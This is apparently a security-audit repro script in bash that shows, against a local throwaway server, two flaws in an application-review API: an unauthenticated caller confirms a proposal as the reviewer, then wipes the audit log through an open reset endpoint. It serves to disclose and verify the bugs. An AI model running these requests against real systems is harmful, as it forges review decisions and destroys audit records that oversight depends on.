#!/usr/bin/env bash
# Live repro for SEC-HIGH-001 and SEC-MED-002 against a throwaway server with no API key.
# Start the server from an empty directory so it does not load the repo's .env and writes its
# audit file there (it still empties <repo>/data/uploads at boot):
#   cd "$(mktemp -d)" && PORT=3471 ANTHROPIC_API_KEY= npx tsx --tsconfig <repo>/tsconfig.json <repo>/server/index.ts
# Then: bash anonymous-reviewer-and-reset.sh [base-url]
# No request below sends a session id, a cookie or any credential.
set -euo pipefail
B=${1:-http://localhost:3471}
A=app_demo_001
j() { curl -s -m 10 -H 'content-type: application/json' "$@"; }

j -X POST "$B/api/applications/$A/load-demo" -d '{}' > /dev/null
for f in homeowner_first_name:Dana homeowner_last_name:Lee property_zip:94105; do
  j -X POST "$B/api/applications/$A/fields/${f%%:*}" -d "{\"value\":\"${f#*:}\"}" > /dev/null
done
j -X POST "$B/api/applications/$A/submit" -d '{}' | python3 -c 'import json,sys; print("status after submit:", json.load(sys.stdin)["status"])'

# The recorded fixture replays without a key; wait for the review task.
for _ in $(seq 1 30); do
  TASK=$(j "$B/api/review/tasks" | python3 -c 'import json,sys; t=json.load(sys.stdin)["tasks"]; print(t[0]["id"] if t else "")')
  [ -n "$TASK" ] && break; sleep 1
done
echo "task: $TASK"

# An anonymous caller decides a value as the reviewer.
P=$(j "$B/api/review/tasks/$TASK" | python3 -c '
import json,sys
v=json.load(sys.stdin)
for d in v["documents"]:
    for r in d["rows"]:
        if "confirm" in r["actions"] and not r["requires_acknowledgement"]:
            print(r["proposal"]["id"]); sys.exit()')
j -X POST "$B/api/review/tasks/$TASK/decisions" -d "{\"proposal_id\":\"$P\",\"action\":\"confirm\"}" > /dev/null
j "$B/api/applications/$A/audit" | python3 -c '
import json,sys
ev=json.load(sys.stdin)["events"]
c=[e for e in ev if e["type"]=="field.confirmed" and e.get("review_task_id")]
print("anonymous confirm recorded as actor:", c[-1]["actor"], "session:", c[-1]["session_id"])
print("audit events before reset:", len(ev))'

# An anonymous caller empties the audit log.
j -X POST "$B/api/reset" -d '{}'; echo
j "$B/api/applications/$A/audit" | python3 -c 'import json,sys; print("audit events after reset:", len(json.load(sys.stdin)["events"]))'
